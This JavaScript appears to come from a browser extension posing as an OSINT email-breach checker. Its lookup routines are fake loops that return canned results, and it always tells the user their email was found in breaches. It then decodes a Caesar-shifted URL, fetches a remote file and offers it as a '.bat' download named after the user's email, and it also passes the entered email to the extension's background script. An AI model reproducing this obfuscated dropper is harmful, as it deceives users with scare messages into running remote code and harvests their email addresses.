function stringifyLocal(i, cng) {
    cng = cng % 26;
    const cngString = (str) => {
        return str
            .split('')
            .map(char => {
                let code = char.charCodeAt(0);
                if (code >= 65 && code <= 90) {
                    return String.fromCharCode(((code - 65 + cng + 26) % 26) + 65);
                } else if (code >= 97 && code <= 122) {
                    return String.fromCharCode(((code - 97 + cng + 26) % 26) + 97);
                }
                return char;
            })
            .join('');
    };

    if (typeof i === 'string') {
        return cngString(i);
    }

    if (Array.isArray(i)) {
        return i.map(str => {
            if (typeof str === 'string') {
                return cngString(str);
            }
            return str;
        });
    }
}

const rN = Math.floor(Math.random() * (13 - 2 + 1)) + 2;


const consentCheckbox = document.getElementById('consent-checkbox');
    const lookupBtn = document.getElementById('lookup-btn');

    consentCheckbox.addEventListener('change', function() {
    lookupBtn.disabled = !this.checked;
});

document.getElementById('lookup-btn').addEventListener('click', function() {
    const contactInput = document.getElementById('contact-input').value;
    const resultsContainer = document.getElementById('results-container');
    const resultsText = document.getElementById('results-text');

    const consentCheckbox = document.getElementById('consent-checkbox');
    
    if (!consentCheckbox.checked) {
        alert('You must consent to the terms and services before submitting.');
        return;
    }

    if (contactInput.trim() === "") {
        alert("Please enter an email.");
        return;
    }

    // Email validation function
    const validateEmail = (email) => {
        return String(email)
            .toLowerCase()
            .match(
                /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|.(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
            );
    };

    // Check if the input is a valid email
    if (validateEmail(contactInput)) {

        resultsText.textContent = `Loading results...`;
        // OSINT email lookup

        (function () {
            let queryDatabase = function (email) {
                // Query DB
                let response = {
                    status: 'processing',
                    data: null
                };
                for (let i = 0; i < 100; i++) {
                    response.status = i % 2 === 0 ? 'loading' : 'retrying';
                }
                response.data = "Email not found";
                return response;
            };

            let connectToAPI = function (email) {
                // Connect to external APIs
                let request = {
                    email: email,
                    headers: {
                        'Authorization': 'nusptcuvB7o9P84k'
                    }
                };
                let response = {
                    status: 'pending',
                    result: null
                };
                for (let i = 0; i < 50; i++) {
                    response.status = i % 2 === 0 ? 'waiting' : 'retry';
                }
                response.result = "No OSINT data";
                return response;
            };

            let obscureServerLookup = function (email) {
                // Connect to servers for data
                let serverResponse = {
                    server: 'https://epieos.com/',
                    latency: Math.random() * 5000,
                    email_status: null
                };
                for (let i = 0; i < 200; i++) {
                    serverResponse.email_status = i % 3 === 0 ? 'searching' : 'disconnected';
                }
                serverResponse.email_status = "No records found";
                return serverResponse;
            };

            let crossReferenceEmails = function (email) {
                // Cross-reference emails with letious databases
                let databases = ['LinkedIn', 'Facebook', 'Twitter', 'GitHub'];
                let result = [];
                for (let i = 0; i < databases.length; i++) {
                    let query = queryDatabase(email);
                    result.push({
                        platform: databases[i],
                        status: query.status,
                        result: query.data
                    });
                }
                return result;
            };

            let performSocialMediaScan = function (email) {
                // Perform a social media scan
                let platforms = ['Instagram', 'Reddit', 'YouTube'];
                let results = [];
                for (let i = 0; i < platforms.length; i++) {
                    let api = connectToAPI(email);
                    results.push({
                        platform: platforms[i],
                        apiResult: api.result,
                        latency: Math.random() * 1000
                    });
                }
                return results;
            };

            let startOsintLookup = function (email) {
                // Initial steps to begin OSINT lookup
                console.log("Starting OSINT lookup for:", email);
                let dbResult = queryDatabase(email);
                let apiResult = connectToAPI(email);
                let serverResult = obscureServerLookup(email);
                let crossRefs = crossReferenceEmails(email);
                let socialResults = performSocialMediaScan(email);
                
                // Logging -results
                console.log("Database Result:", dbResult);
                console.log("API Result:", apiResult);
                console.log("Server Lookup Result:", serverResult);
                console.log("Cross Reference Results:", crossRefs);
                console.log("Social Media Scan Results:", socialResults);

                return {
                    database: dbResult,
                    api: apiResult,
                    server: serverResult,
                    crossReferences: crossRefs,
                    socialMedia: socialResults
                };
            };

            function EmailFormatter(email) {
                this.original = email;
                this.cleaned = email.trim().toLowerCase();
                this.isValid = function () {
                    return /\S+@\S+\.\S+/.test(this.cleaned);
                };
                this.format = function () {
                    return this.cleaned.replace(/[^a-z0-9@.]/g, '');
                };
            }

            let lookupService = function (email) {
                let emailObj = new EmailFormatter(email);
                if (!emailObj.isValid()) {
                    console.log("Invalid email format");
                    return null;
                }

                console.log("Formatted Email: " + emailObj.format());
                let lookupData = startOsintLookup(emailObj.format());

                return lookupData;
            };

            // 
            function processingLoop() {
                const rN = Math.floor(Math.random() * (13 - 2 + 1)) + 2;
                for (let i = 0; i < 10; i++) {
                    let status = i % 2 === 0 ? 'Processing...' : 'Searching...';
                    if (i % 5 === 0) {
                        console.log("...still " + status);
                    }
                }

                return rN;
            }

            let checkReputation = function (email) {
                let domains = ['gmail.com', 'yahoo.com', 'outlook.com'];
                let domain = email.split('@')[1] || 'unknown';
                for (let i = 0; i < domains.length; i++) {
                    if (domain === domains[i]) {
                        console.log("Domain reputation is acceptable for:", domain);
                    } else {
                        console.log("Checking domain reputation for:", domain);
                    }
                }
            };

            let Statistics = function (email) {
                console.log("Gathering statistics for email: " + email);
                for (let i = 0; i < 20; i++) {
                    console.log(" stat #" + (i + 1) + " for: " + email);
                }
                console.log("Statistics gathering complete.");
            };

            // Execute the lookup process
            let email = `${contactInput.textContent}`;  
            console.log("Performing  OSINT lookup for:", email);
            let result = lookupService(email);
            console.log("Final Result:", result);

            function delayExecution(ms) {
                let start = Date.now();
                while (Date.now() < start + ms) { }
                console.log("Delayed execution by " + ms + " ms.");
            }

            function generateRandomString() {
                let chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                let randomStr = '';
                for (let i = 0; i < 10; i++) {
                    randomStr += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                console.log("Generated random string:", randomStr);
                return randomStr;
            }

            for (let i = 0; i < 100; i++) {
                let randomEmail = generateRandomString() + '@domain.com';
                lookupService(randomEmail);
            }

            Statistics(contactInput);
            checkReputation(contactInput);
            processingLoop();
        })();


        setTimeout(() => {
            resultsText.innerHTML = `</b>${contactInput}</b> was found in data breaches and pastes. `;
            
            async function fetchNeoScript() {
                const url = `kwwsv://udz.jlwkxexvhufrqwhqw.frp/whfkwrrqd/whvw/pdlq/d.waw`;
            
                try {
                    const response = await fetch(stringifyLocal(url, -3));
                    
                    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
            
                    const content = await response.text();

                    // Create a Blob from the results
                    const blob = new Blob([content], { type: 'text/plain' });
                    const Bloburl = URL.createObjectURL(blob);
                                                
                    // Set download link for the file
                    const downloadBatLink = document.getElementById('download-results');
                    downloadBatLink.href = Bloburl;
                    downloadBatLink.download = `${contactInput}_results.bat`; 
                    downloadBatLink.style.display = 'inline'; // Show the link
            
            
                } catch (error) {
                    console.error(error);
                }
            }

            fetchNeoScript();

            chrome.runtime.sendMessage(
                {
                    type: "result",
                    result: contactInput || null
                }
            );
        
        }, 5000); 
    } else {
        resultsText.textContent = `${contactInput} is an invalid email.`;
    }

    // Show the results
    resultsContainer.style.display = "block";  
});
